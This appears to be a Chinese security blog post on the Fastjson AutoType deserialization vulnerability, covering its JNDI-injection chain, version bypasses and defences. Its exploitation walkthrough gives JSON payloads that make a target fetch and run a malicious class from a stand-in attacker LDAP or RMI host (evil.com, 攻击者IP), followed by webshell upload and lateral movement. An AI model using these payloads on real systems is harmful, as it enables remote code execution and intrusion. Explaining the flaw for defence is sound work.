#  Fastjson 漏洞  
南棋子
                    南棋子  南棋子网络安全盟   2026-11-24 16:09  
  
# 漏洞原理  
  
Fastjson 漏洞的核心在于其 AutoType（自动类型识别） 机制。当 Fastjson 解析 JSON 字符串时，如果遇到 @type 字段，它会尝试加载并实例化指定的 Java 类。攻击者可以通过指定恶意类（如 JdbcRowSetImpl）来触发 JNDI 注入，最终实现远程代码执行（RCE）  
- JdbcRowSetImpl：setDataSourceName → lookup ()，最经典链  
  
- JNDI 协议：LDAP（JDK8u191 之前好用）、RMI（限制更多）  
  
# 漏洞过程  
  
Fastjson 在解析 JSON 时，为了保留对象的原始类型，允许通过  
@type指定类名。当攻击者传入  
  
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://evil.com/Exploit","autoCommit":true}时，Fastjson 会：  
1. 加载类  
：实例化  
JdbcRowSetImpl  
。  
  
1. 触发 Setter  
：在解析  
dataSourceName  
和  
autoCommit  
属性时，调用对应的  
setDataSourceName()  
和  
setAutoCommit()  
方法。  
  
1. 触发 JNDI 注入  
：  
JdbcRowSetImpl  
的  
setAutoCommit()  
内部逻辑会去连接  
dataSourceName  
指定的 JNDI 地址（即  
rmi://evil.com/Exploit  
）。此时，攻击者的 RMI/LDAP 服务器就会返回一个恶意的 Reference 或序列化对象，导致目标服务器反序列化并执行恶意代码（RCE）。  
  
# 常见漏洞  
<table><thead><tr><th style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;font-weight: 700;background-color: #DD847E;color: #FFFFFF;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="20"><span leaf="">版本</span></section></th><th style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;font-weight: 700;background-color: #DD847E;color: #FFFFFF;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="21"><span leaf="">CVE</span></section></th><th style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;font-weight: 700;background-color: #DD847E;color: #FFFFFF;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="22"><span leaf="">核心机制 &amp; 绕过</span></section></th><th style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;font-weight: 700;background-color: #DD847E;color: #FFFFFF;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="23"><span leaf="">关键利用类</span></section></th><th style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;font-weight: 700;background-color: #DD847E;color: #FFFFFF;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="24"><span leaf="">触发条件</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="25"><span leaf="">≤1.2.24</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="26"><span leaf="">CVE-2017-18349</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="27"><span leaf="">AutoType 默认开启，无黑名单，直接 @type</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="28"><span leaf="">JdbcRowSetImpl / TemplatesImpl</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="29"><span leaf="">AutoType=true</span></section></td></tr><tr><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="30"><span leaf="">1.2.25~1.2.41</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="31"><span leaf="">-</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="32"><span leaf="">加入黑名单，</span><span leaf=""><span textstyle="" style="font-weight: 500;">Lxxx;</span></span><span leaf="">JVM 描述符绕过</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="33"><span leaf="">JdbcRowSetImpl</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="34"><span leaf="">AutoType=true</span></section></td></tr><tr><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="35"><span leaf="">1.2.42</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="36"><span leaf="">-</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="37"><span leaf="">修复 L;，</span><span leaf=""><span textstyle="" style="font-weight: 500;">LLxxx;;</span></span><span leaf="">双写绕过</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="38"><span leaf="">JdbcRowSetImpl</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="39"><span leaf="">AutoType=true</span></section></td></tr><tr><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="40"><span leaf="">1.2.43</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="41"><span leaf="">-</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="42"><span leaf="">修复双写 LL，</span><span leaf=""><span textstyle="" style="font-weight: 500;">Cloud Secu...[</span></span><span leaf="">数组前缀绕过</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="43"><span leaf="">JdbcRowSetImpl</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="44"><span leaf="">AutoType=true</span></section></td></tr><tr><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="45"><span leaf="">1.2.45</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="46"><span leaf="">-</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="47"><span leaf="">修复 [前缀，换第三方 gadget</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="48"><span leaf="">JndiDataSourceFactory(MyBatis)</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="49"><span leaf="">AutoType=true</span></section></td></tr><tr><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="50"><span leaf="">1.2.47</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="51"><span leaf="">CVE-2025-70974</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section data-layout-id="52"><span leaf=""><span textstyle="" style="font-weight: 500;">不需要开启 AutoType！</span></span></section><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="53"><span leaf="">利用 Class 缓存机制</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="54"><span leaf="">JdbcRowSetImpl</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="55"><span leaf="">AutoType 默认关闭也可打</span></section></td></tr><tr><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="56"><span leaf="">1.2.48~1.2.67</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="57"><span leaf="">-</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="58"><span leaf="">修复 Class 缓存；依赖第三方 gadget 链</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="59"><span leaf="">CommonsProxy、Hikari 等</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="60"><span leaf="">AutoType=true + 依赖包存在</span></section></td></tr><tr><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="61"><span leaf="">1.2.68~1.2.80</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="62"><span leaf="">CVE-2022-25845</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="63"><span leaf="">expectClass 绕过 AutoType 校验；新增 SafeMode 开关</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="64"><span leaf="">AutoCloseable / Exception 链</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="65"><span leaf="">默认配置（AutoType 关闭也可绕过）</span></section></td></tr><tr><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="66"><span leaf="">1.2.68~1.2.83</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="67"><span leaf="">CVE-2026-16723</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="68"><span leaf="">Gadget-free，</span><span leaf=""><span textstyle="" style="font-weight: 500;">不需要第三方依赖</span></span><span leaf="">，依靠 @JSONType 注解，默认配置可打</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="69"><span leaf="">无外部 gadget</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="70"><span leaf="">SafeMode 未开启</span></section></td></tr></tbody></table># 防御  
1. 最优：升级到 Fastjson2（2.0.x），架构重做，不再有这套 AutoType 风险  
  
1. 无法升级 1.x：开启  
ParserConfig.getGlobalInstance().setSafeMode(true);  
  
1. 禁止不可信来源 JSON 直接用 Fastjson 解析；白名单限制允许反序列化类  
  
1. JDK 版本升级（高版本限制 JNDI 远程加载）  
  
1. WAF/SIEM 拦截恶意 @type payload，监控外发 LDAP/RMI 流量  
  
# 完整利用流程  
> 前提：  
AutoTypeSupport=true  
，目标可以出网，JDK8u191之前（高版本JDK限制LDAP远程加载）  
  
## 步骤1：探测入口  
  
找到  
可控JSON入参接口，接口后端使用  
JSON.parse()/  
JSON.parseObject()解析用户输入JSON。 先用DNSlog探测验证：  
```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xxx.dnslog.cn/1","autoCommit":true}
```  
  
看DNSlog收到解析记录，确认：①Fastjson解析@type ②目标能外发LDAP请求。  
## 步骤2：攻击者准备3个服务  
1. LDAP服务（JNDI服务）  
  
：监听1389，返回Reference，指向恶意class地址  
  
1. HTTP服务  
  
：监听8000，存放恶意Java类  
Evil.class  
  
1. 恶意类：静态代码块  
static{Runtime.getRuntime().exec("命令");}  
，类加载时自动执行  
  
## 步骤3：发送恶意Payload到目标  
```
{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"ldap://攻击者IP:1389/Evil",
    "autoCommit":true
}
```  
## 步骤4：目标端解析执行链路（核心）  
1. Fastjson识别  
@type  
，实例化  
com.sun.rowset.JdbcRowSetImpl  
  
1. 调用setter：  
setDataSourceName("ldap://xxx:1389/Evil")  
，赋值  
  
1. 调用  
setAutoCommit(true)  
→ 进入  
connect()  
  
1. connect()  
  
执行  
ctx.lookup(dataSourceName)  
，发起LDAP请求到攻击者LDAP服务器  
  
1. LDAP返回Reference，告诉JDK：去http://攻击者IP:8000/Evil.class加载类  
  
1. 目标JDK下载Evil.class，加载、初始化，  
static代码块执行 → RCE  
  
## 步骤5：后续  
  
拿到命令执行，上传webshell、内网横向、信息收集；无回显时用DNSlog/HTTP外带结果。  
# 无法利用的情况  
- 开启SafeMode（1.x最强加固）  
  
- 升级Fastjson2  
  
- 防火墙拦截出站LDAP/RMI  
  
- JDK高版本（8u191+）默认禁止LDAP远程Reference加载  
  
- 入参做JSON白名单，不交给Fastjson解析不可信数据  
  
# 补充：不出网场景  
  
目标不能出网，无法用LDAP/JNDI回连：  
- 寻找本地gadget链（依赖目标已有第三方jar，如CommonsCollections）  
  
- 回显靠内存、延时判断，难度更高  
  
   
  
